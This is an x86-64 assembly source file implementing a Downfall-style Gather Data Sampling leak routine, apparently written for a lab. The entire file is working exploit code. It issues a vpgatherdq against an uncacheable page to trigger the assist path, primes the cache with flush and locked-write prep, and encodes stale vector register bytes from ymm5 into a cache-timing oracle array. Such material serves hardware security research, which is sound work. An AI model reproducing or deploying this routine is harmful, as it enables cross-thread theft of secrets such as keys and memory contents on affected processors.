/* Cross-thread GDS sampler (AVX2 port of the flowyroll/downfall
 * s_load_encode shape, retargeted to this lab's L1D geometry).
 *
 * void s_load_encode(const uint32_t *perm, uint8_t *oracle, const void *base,
 *                    unsigned shift);
 *   rdi = perm (8 dword indices for vpermd)
 *   rsi = oracle (8 rows x 64 classes x 0x1040; class = (byte ^ 0x3f) & 0x3f)
 *   rdx = gather base: /dev/mem UC page (assist) or a normal WB page (control)
 *   rcx = encoder-side right shift (0-7) applied to the leaked qword before
 *         the byte extraction; 2 exposes bits 7..2 of each byte
 *
 * The gather reads the same address four times (zero indices, all-ones
 * mask). On an affected CPU the assist path can leave stale vector
 * register file data in ymm5; the low qword is encoded byte by byte, one
 * row per byte. The helper buffer prep mirrors the upstream P_CACHE_MISS
 * configuration. No AVX-512 opcodes (vpxor, not vpxord).
 */

.set SLOT, 0x1040
.set ROW_STEP, 0x41000
.set XOR_KEY, 0x3f

.macro enc_byte shift, reg
    mov %rax, \reg
    shr $\shift, \reg
    and $0xff, \reg
    xor $XOR_KEY, \reg
    and $0x3f, \reg
    imul $SLOT, \reg, \reg
    mov (%r14, \reg), \reg
    add $ROW_STEP, %r14
.endm

.section .bss
.align 4096
address_helper:
    .space 4096

.section .text
.global s_load_encode
.type s_load_encode, @function
.align 0x40
s_load_encode:
    endbr64
    push %rbx
    push %r12
    push %r13
    push %r14
    push %r15

    mov %rdi, %r12          /* perm */
    mov %rsi, %r15          /* oracle base (kept; r14 moves per row) */
    mov %rdx, %r13          /* gather base */

    lfence
    mfence
    .rept 32
    inc %eax
    .endr

    vmovups (%r12), %ymm3
    vpxor %ymm1, %ymm1, %ymm1
    vpcmpeqb %ymm2, %ymm2, %ymm2

    /* P_CACHE_MISS-style prep (upstream default configuration). */
    lea address_helper(%rip), %r14
    .set i, 0
    .rept 8
    clflush 64*i(%r14)
    mov 64*i(%r14), %rax
    .set i, i+1
    .endr
    .set i, 0
    .rept 4
    xchg %rax, 64*i(%r14)
    .set i, i+1
    .endr
    .set i, 0
    .rept 4
    lock incq 64*i(%r14)
    .set i, i+1
    .endr

    vpgatherdq %ymm2, 0(%r13, %xmm1, 1), %ymm5
    vpermd %ymm5, %ymm3, %ymm5

    vmovq %xmm5, %rax
    shr %cl, %rax           /* ESHIFT: encoder-side bit offset (0 = off) */
    mov %r15, %r14
    enc_byte 0,  %rbx
    enc_byte 8,  %rcx
    enc_byte 16, %rdx
    enc_byte 24, %r8
    enc_byte 32, %r9
    enc_byte 40, %r10
    enc_byte 48, %r11
    enc_byte 56, %rbx

    vzeroupper
    pop %r15
    pop %r14
    pop %r13
    pop %r12
    pop %rbx
    ret

.section .note.GNU-stack, "", @progbits
